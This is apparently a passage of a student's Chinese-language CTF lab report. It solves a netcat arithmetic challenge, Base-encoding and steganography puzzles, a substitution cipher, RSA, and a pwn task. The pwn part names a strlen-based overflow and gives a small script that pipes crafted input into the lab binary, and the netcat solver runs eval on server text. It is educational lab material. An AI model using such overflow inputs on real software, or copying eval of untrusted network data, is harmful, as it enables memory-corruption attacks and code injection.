<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="n">data_new</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="c1"># 让data_new的值设为&quot;&quot;。或者说是初始化一个str data_new</span>
<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span> <span class="c1"># 在data中遍历。每个字符用d代替</span>
<a id="__codelineno-0-9" name="__codelineno-0-9"></a>    <span class="k">if</span> <span class="n">d</span> <span class="ow">in</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">:</span> <span class="c1">#如果那个字符是个小写字母</span>
<a id="__codelineno-0-10" name="__codelineno-0-10"></a>        <span class="n">data_new</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span> <span class="c1"># 给data_new末尾加上它对应的大写字母。ord就是转ascii，chr从ascii转回来，-32就是从小写到大写</span>
<a id="__codelineno-0-11" name="__codelineno-0-11"></a>    <span class="k">elif</span> <span class="n">d</span> <span class="ow">in</span> <span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">:</span> <span class="c1"># 如果是大写的</span>
<a id="__codelineno-0-12" name="__codelineno-0-12"></a>        <span class="n">data_new</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="c1"># 就加上小写的</span>
<a id="__codelineno-0-13" name="__codelineno-0-13"></a>    <span class="k">else</span><span class="p">:</span> <span class="c1"># 不是字母</span>
<a id="__codelineno-0-14" name="__codelineno-0-14"></a>        <span class="n">data_new</span> <span class="o">+=</span> <span class="n">d</span> <span class="c1"># 保持不变</span>
<a id="__codelineno-0-15" name="__codelineno-0-15"></a>
<a id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;now your string:&quot;</span><span class="p">,</span> <span class="n">data_new</span><span class="p">)</span> <span class="c1"># 打印&quot;now your string: &quot;然后输出刚刚大小写互换的字符串</span>
</code></pre></div></td></tr></table></div>
<p>校巴上这道题去年做过一次了</p>
<p><img alt="alt text" src="../lab0_1.png" /></p>
<p>不过再做一次也可以：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-1-10">10</a></span>
<span class="normal"><a href="#__codelineno-1-11">11</a></span>
<span class="normal"><a href="#__codelineno-1-12">12</a></span>
<span class="normal"><a href="#__codelineno-1-13">13</a></span>
<span class="normal"><a href="#__codelineno-1-14">14</a></span>
<span class="normal"><a href="#__codelineno-1-15">15</a></span>
<span class="normal"><a href="#__codelineno-1-16">16</a></span>
<span class="normal"><a href="#__codelineno-1-17">17</a></span>
<span class="normal"><a href="#__codelineno-1-18">18</a></span>
<span class="normal"><a href="#__codelineno-1-19">19</a></span>
<span class="normal"><a href="#__codelineno-1-20">20</a></span>
<span class="normal"><a href="#__codelineno-1-21">21</a></span>
<span class="normal"><a href="#__codelineno-1-22">22</a></span>
<span class="normal"><a href="#__codelineno-1-23">23</a></span>
<span class="normal"><a href="#__codelineno-1-24">24</a></span>
<span class="normal"><a href="#__codelineno-1-25">25</a></span>
<span class="normal"><a href="#__codelineno-1-26">26</a></span>
<span class="normal"><a href="#__codelineno-1-27">27</a></span>
<span class="normal"><a href="#__codelineno-1-28">28</a></span>
<span class="normal"><a href="#__codelineno-1-29">29</a></span>
<span class="normal"><a href="#__codelineno-1-30">30</a></span>
<span class="normal"><a href="#__codelineno-1-31">31</a></span>
<span class="normal"><a href="#__codelineno-1-32">32</a></span>
<span class="normal"><a href="#__codelineno-1-33">33</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="kn">import</span> <span class="nn">subprocess</span>
<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">fcntl</span>
<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="kn">import</span> <span class="nn">os</span>
<a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="kn">import</span> <span class="nn">re</span>
<a id="__codelineno-1-5" name="__codelineno-1-5"></a>
<a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span>
<a id="__codelineno-1-7" name="__codelineno-1-7"></a>    <span class="p">[</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span> <span class="s1">&#39;10.214.160.13&#39;</span><span class="p">,</span> <span class="s1">&#39;11002&#39;</span><span class="p">],</span>
<a id="__codelineno-1-8" name="__codelineno-1-8"></a>    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
<a id="__codelineno-1-9" name="__codelineno-1-9"></a>    <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
<a id="__codelineno-1-10" name="__codelineno-1-10"></a>    <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
<a id="__codelineno-1-11" name="__codelineno-1-11"></a>    <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
<a id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="p">)</span>
<a id="__codelineno-1-13" name="__codelineno-1-13"></a>
<a id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="n">fd</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">fileno</span><span class="p">()</span>
<a id="__codelineno-1-15" name="__codelineno-1-15"></a><span class="n">fl</span> <span class="o">=</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">fcntl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">F_GETFL</span><span class="p">)</span>
<a id="__codelineno-1-16" name="__codelineno-1-16"></a><span class="n">fcntl</span><span class="o">.</span><span class="n">fcntl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">F_SETFL</span><span class="p">,</span> <span class="n">fl</span> <span class="o">|</span> <span class="n">os</span><span class="o">.</span><span class="n">O_NONBLOCK</span><span class="p">)</span>
<a id="__codelineno-1-17" name="__codelineno-1-17"></a>
<a id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="n">buffer</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
<a id="__codelineno-1-20" name="__codelineno-1-20"></a>    <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-1-21" name="__codelineno-1-21"></a>        <span class="n">data</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<a id="__codelineno-1-22" name="__codelineno-1-22"></a>        <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
<a id="__codelineno-1-23" name="__codelineno-1-23"></a>            <span class="n">buffer</span> <span class="o">+=</span> <span class="n">data</span>
<a id="__codelineno-1-24" name="__codelineno-1-24"></a>            <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<a id="__codelineno-1-25" name="__codelineno-1-25"></a>            <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([+-\d\s]+)=\s*$&#39;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">)</span>
<a id="__codelineno-1-26" name="__codelineno-1-26"></a>            <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
<a id="__codelineno-1-27" name="__codelineno-1-27"></a>                <span class="n">expr</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-1-28" name="__codelineno-1-28"></a>                <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span>
<a id="__codelineno-1-29" name="__codelineno-1-29"></a>                <span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-1-30" name="__codelineno-1-30"></a>                <span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
<a id="__codelineno-1-31" name="__codelineno-1-31"></a>                <span class="n">buffer</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<a id="__codelineno-1-32" name="__codelineno-1-32"></a>    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
<a id="__codelineno-1-33" name="__codelineno-1-33"></a>        <span class="k">pass</span>
</code></pre></div></td></tr></table></div>
<p>整体逻辑就是<code>nc</code>类似于一个程序，发送过来一个巨长的数学式子，只要用python进行计算（eval自动转换）即可。之后再写到stdin进行flush即可。<br />
（理论上用exec也能玩的来）</p>
<div style="page-break-after: always;"></div>

<h2 id="misc">MISC<a class="headerlink" href="#misc" title="Permanent link">&para;</a></h2>
<h4 id="challenge-1_1">Challenge 1<a class="headerlink" href="#challenge-1_1" title="Permanent link">&para;</a></h4>
<p>老规矩先贴flag：<code>AAA{wELc0m3_t0_Ctf_5umMEr_c0UrsE_2025}</code></p>
<p>首先观察题目，题目里面提示了要了解base相关内容，那理所应当的往base上面想。因为以=结尾，所以考虑Base64+。尝试了一遍后发现Base85解码后以==结尾。所以继续使用Base64解码。再度解码后又以===结尾，于是<s>烘焙</s>解码过程就是Base85-Base64-Base32，最终获得了这个flag。</p>
<h4 id="challenge-2_1">Challenge 2<a class="headerlink" href="#challenge-2_1" title="Permanent link">&para;</a></h4>
<p>图片隐写，<s>这个我曾经干过，在某个发布的工具包logo图片里面藏涩图（x）</s></p>
<p>flag：<code>AAA{gr3@t_J08!_1et'5_P1@y_m1SC_TOG3Th3R}</code></p>
<p>hint给完的难度就低了很多。首先是LSB隐写，用在线工具Aperi'Solve自动分析，发现Red通道下可以找到图片中的前半段flag：</p>
<p><img alt="alt text" src="../lab0_2.png" /></p>
<p>（“请仔细观察图片”，这人眼也太高级了）</p>
<p>后半段是查看文件内容，于是尝试exiftool和strings，发现<code>strings misc_challenge2.png</code>可以直接输出后半段flag。于是得到本flag。</p>
<div style="page-break-after: always;"></div>

<h2 id="crypto">Crypto<a class="headerlink" href="#crypto" title="Permanent link">&para;</a></h2>
<h4 id="challenge-1_2">Challenge 1<a class="headerlink" href="#challenge-1_2" title="Permanent link">&para;</a></h4>
<p>读了一遍“跳舞的小人”，有点纳闷这byd旗子到底是怎么看出来是旗子的，有点抽象了属于是</p>
<p>首先遍观全图，根据以往的<s>日语经验</s>，看到有圈但是没看到两撇（bushi，结合是英文题目考虑这可能是大写或者空格。而根据头没有圈而尾有圈，考虑这个圈代表空格。然后随便给它们排下号，把图片翻译成了如下一段话：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a>ABCDEFA GAFHC IDJJ HKKDLG FGKG MJGHNG JSKG FDT AB AFG HOHCPBCGP IHKGFBSNG CGHK AFG MBJDQG NAHADBC IFGKG AFG MKBRGNNDBCHJ HNNHNNDC KGGNG FDKGP IDJJ GJDTDCHAG FDT ABTBKKBI NFG IDJJ EB AB AFG IHKGFBSNG HCP OGQBTG AFG RDKNA MGKNBC AB PDNQBLGK FDN QBKMNG IDAF H NAKBCE HJDOD AFGNG MBJDQG BRRDQGKN HONBJSAGJU QHC CBA HKKGNA FGK
</code></pre></div></td></tr></table></div>
<p>ok我在转译的时候就发现了有个单词<code>AFG</code>出现的很频，所以考虑这个单词是the。</p>
<p><center>
[A=t, F=h, G=e]
</center></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>tBCDEht ethHC IDJJ HKKDLe heKe MJeHNe JSKe hDT tB the HOHCPBCeP IHKehBSNe CeHK the MBJDQe NtHtDBC IheKe the MKBReNNDBCHJ HNNHNNDC KeeNe hDKeP IDJJ eJDTDCHte hDT tBTBKKBI Nhe IDJJ EB tB the IHKehBSNe HCP OeQBTe the RDKNt MeKNBC tB PDNQBLeK hDN QBKMNe IDth H NtKBCE HJDOD theNe MBJDQe BRRDQeKN HONBJSteJU QHC CBt HKKeNt heK
</code></pre></div></td></tr></table></div>
<p>然后看到了比较特殊的<code>Nhe</code>, <code>tB</code>, <code>H</code>，首先是这个<code>tB</code>，因为英文单词必须有元音（含半），而ta, te, ti, tu, ty, tw都不是单词，所以<code>B</code>只能代表o。而相应的<code>H</code>可能是a或i。又he结尾的三个英文单词的词只有she, the有意义，前面的<code>A</code>已经代表t了，于是<code>N</code>只能代表s。</p>
<p><center>
[A=t, F=h, G=e, B=o, N=s, H=a/i]
</center></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>toCDEht ethHC IDJJ HKKDLe heKe MJeHse JSKe hDT to the HOHCPoCeP IHKehoSse CeHK the MoJDQe stHtDoC IheKe the MKoRessDoCHJ HssHssDC Keese hDKeP IDJJ eJDTDCHte hDT toToKKoI she IDJJ Eo to the IHKehoSse HCP OeQoTe the RDKst MeKsoC to PDsQoLeK hDs QoKMse IDth H stKoCE HJDOD these MoJDQe oRRDQeKs HOsoJSteJU QHC Cot HKKest heK
</code></pre></div></td></tr></table></div>
<p>紧接着可以看到<code>Eo</code>，猜测是go。于是<code>E</code>=g。另外我在开发游戏谁是国王的时候，这个byd游戏最开始叫King Assassin，当时就开玩笑说这是king ass♂ass♂in，没想到我看到这个<code>HssHssDC</code>还真能让我想起来这个byd词，于是<code>HDC</code>就是ain。</p>
<p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n]
</center></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a>tonight ethan IiJJ aKKiLe heKe MJease JSKe hiT to the aOanPoneP IaKehoSse neaK the MoJiQe station IheKe the MKoRessionaJ assassin Keese hiKeP IiJJ eJiTinate hiT toToKKoI she IiJJ go to the IaKehoSse anP OeQoTe the RiKst MeKson to PisQoLeK his QoKMse Iith a stKong aJiOi these MoJiQe oRRiQeKs aOsoJSteJU Qan not aKKest heK
</code></pre></div></td></tr></table></div>
<p>这个时候已经能看到前面两个词是今晚Ethan。这个纯靠语感就想到了<code>IiJJ</code>是will，所以<code>IJ</code>代表wl。</p>
<p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l]
</center></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>tonight ethan IiJJ aKKiLe heKe MJease JSKe hiT to the aOanPoneP IaKehoSse neaK the MoJiQe station IheKe the MKoRessionaJ assassin Keese hiKeP IiJJ eJiTinate hiT toToKKoI she IiJJ go to the IaKehoSse anP OeQoTe the RiKst MeKson to PisQoLeK his QoKMse Iith a stKong aJiOi these MoJiQe oRRiQeKs aOsoJSteJU Qan not aKKest heK
</code></pre></div></td></tr></table></div>
<p>再根据<code>wheKe</code>和<code>neaK</code>猜测<code>K</code>代表r。<code>arriLe</code>猜测<code>L</code>代表v。</p>
<p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l, K=r, L=v]
</center></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>tonight ethan will arrive here Mlease lSre hiT to the aOanPoneP warehoSse near the MoliQe station where the MroRessional assassin reese hireP will eliTinate hiT toTorrow she will go to the warehoSse anP OeQoTe the Rirst Merson to PisQover his QorMse with a strong aliOi these MoliQe oRRiQers aOsolStelU Qan not arrest her
</code></pre></div></td></tr></table></div>
<p><code>aOsolStelU</code>已经写脸上了，O=b S=u U=y, <code>abanPoneP</code> 是经典老四六级词abandoned, P=d, <code>MroRessional</code> 是 professional, M=p, R=f</p>
<p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l, K=r, L=v, O=b, S=u, U=y, P=d, M=p, R=f]
</center></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>tonight ethan will arrive here please lure hiT to the abandoned warehouse near the poliQe station where the professional assassin reese hired will eliTinate hiT toTorrow she will go to the warehouse and beQoTe the first person to disQover his Qorpse with a strong alibi these poliQe offiQers absolutely Qan not arrest her
</code></pre></div></td></tr></table></div>
<p>那么很容易知道<code>poliQe</code>是police。<code>becoTe</code> 是become</p>
<p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l, K=r, L=v, O=b, S=u, U=y, P=d, M=p, R=f, Q=c, T=m]
</center></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a>tonight ethan will arrive here please lure him to the abandoned warehouse near the police station where the professional assassin reese hired will eliminate him tomorrow she will go to the warehouse and become the first person to discover his corpse with a strong alibi these police officers absolutely can not arrest her
</code></pre></div></td></tr></table></div>
<p>将大小写修改正确并添加标点符号就能获得如下内容：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a>Tonight Ethan will arrive here. Please lure him to the abandoned warehouse near the police station, where the professional assassin Reese hired will eliminate him. Tomorrow, she will go to the warehouse and become the first person to discover his corpse with a strong alibi. These police officers absolutely can not arrest her.
</code></pre></div></td></tr></table></div>
<p>于是翻译如下：</p>
<blockquote>
<p>今晚伊森将抵达这里，并引诱他到警察局附近的废弃仓库，里斯雇佣的专业刺客将在那里消灭他。明天，她将前往仓库，成为第一个发现他尸体的人，并提供强有力的不在场证明。这些警察绝对无法逮捕她
</p>
</blockquote>
<h2 id="challenge-2_2">Challenge 2<a class="headerlink" href="#challenge-2_2" title="Permanent link">&para;</a></h2>
<p>flag: <code>AAA{Ace_Attorney_is_very_fun_Phoenix_Wright&amp;Miles_Edgeworth}</code></p>
<p>这是个非常简单的RSA题，RSA原理这里不再赘述，因为给定了 $ p $ 和 $ q $ ，所以直接上python脚本计算 $ \varphi(n)=(p-1)*(q-1) $ 和 $ d= $ 即可。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-11-10">10</a></span>
<span class="normal"><a href="#__codelineno-11-11">11</a></span>
<span class="normal"><a href="#__codelineno-11-12">12</a></span>
<span class="normal"><a href="#__codelineno-11-13">13</a></span>
<span class="normal"><a href="#__codelineno-11-14">14</a></span>
<span class="normal"><a href="#__codelineno-11-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="n">p</span> <span class="o">=</span> <span class="mh">0x848</span><span class="o">...</span>
<a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="n">q</span> <span class="o">=</span> <span class="mh">0xa0a</span><span class="o">...</span>
<a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
<a id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="n">varphi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
<a id="__codelineno-11-6" name="__codelineno-11-6"></a><span class="n">c</span><span class="o">=</span><span class="mh">0x39f</span><span class="o">...</span>
<a id="__codelineno-11-7" name="__codelineno-11-7"></a><span class="n">d</span><span class="o">=</span><span class="mi">0</span>
<a id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="k">def</span> <span class="nf">ext</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
<a id="__codelineno-11-9" name="__codelineno-11-9"></a>    <span class="k">if</span> <span class="n">b</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
<a id="__codelineno-11-10" name="__codelineno-11-10"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-11-11" name="__codelineno-11-11"></a>    <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-11-12" name="__codelineno-11-12"></a>        <span class="n">g</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="n">ext</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="o">%</span><span class="n">b</span><span class="p">)</span>
<a id="__codelineno-11-13" name="__codelineno-11-13"></a>        <span class="k">return</span> <span class="n">g</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="o">-</span><span class="p">(</span><span class="n">a</span><span class="o">//</span><span class="n">b</span><span class="p">)</span><span class="o">*</span><span class="n">y</span>
<a id="__codelineno-11-14" name="__codelineno-11-14"></a><span class="n">m</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">ext</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">varphi</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">%</span><span class="n">varphi</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<a id="__codelineno-11-15" name="__codelineno-11-15"></a><span class="nb">print</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">))</span>
</code></pre></div></td></tr></table></div>
<div style="page-break-after: always;"></div>

<h2 id="pwn">Pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h2>
<h4 id="task1">Task1<a class="headerlink" href="#task1" title="Permanent link">&para;</a></h4>
<p>在program.c里，有这么几个bug：</p>
<ol>
<li>
<p>Line28使用<code>strlen(tmp-&gt;data)</code>参与计算，而<code>strlen()</code>的计算方法是<strong>直到空字符</strong>，因此这里给入一个不以'\0'结尾的内容就可以在30行的时候overflow</p>
</li>
<li>
<p>Line44声明err但未初始化值，而在Line55为err唯一的赋值语句，这导致如果Line53的条件不满足，那么err将以未定义的值返回。</p>
</li>
</ol>
<h4 id="task2">Task2<a class="headerlink" href="#task2" title="Permanent link">&para;</a></h4>
<p>上面提到的两个bug可以通过输入无'\0'的data和尝试构造令<code>(written!=0 &amp;&amp; written == pkt-&gt;size)</code>为1。为了构造无'\0'的data，使用python脚本注入。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
<span class="normal"><a href="#__codelineno-12-2">2</a></span>
<span class="normal"><a href="#__codelineno-12-3">3</a></span>
<span class="normal"><a href="#__codelineno-12-4">4</a></span>
<span class="normal"><a href="#__codelineno-12-5">5</a></span>
<span class="normal"><a href="#__codelineno-12-6">6</a></span>
<span class="normal"><a href="#__codelineno-12-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="ch">#!/usr/bin/env python3</span>
<a id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="c1">#&gt; This is pwn_lab0.py</span>
<a id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="kn">import</span> <span class="nn">sys</span>
<a id="__codelineno-12-4" name="__codelineno-12-4"></a><span class="kn">import</span> <span class="nn">struct</span>
<a id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="n">pkt</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;IIII&#39;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xFF</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="c1">#0x90=size-16</span>
<a id="__codelineno-12-6" name="__codelineno-12-6"></a><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pkt</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>
<a id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</code></pre></div></td></tr></table></div>
<p>然后执行<code>python3 pwn_lab0.py | ./program.elf</code>，可以得到一堆乱码输出。</p>
<h4 id="task3">Task3<a class="headerlink" href="#task3" title="Permanent link">&para;</a></h4>
<p>（因为不知道是否可以提交code.zip所以把nobug_program.c贴到报告里好了）</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-13-10">10</a></span>
<span class="normal"><a href="#__codelineno-13-11">11</a></span>
<span class="normal"><a href="#__codelineno-13-12">12</a></span>
<span class="normal"><a href="#__codelineno-13-13">13</a></span>
<span class="normal"><a href="#__codelineno-13-14">14</a></span>
<span class="normal"><a href="#__codelineno-13-15">15</a></span>
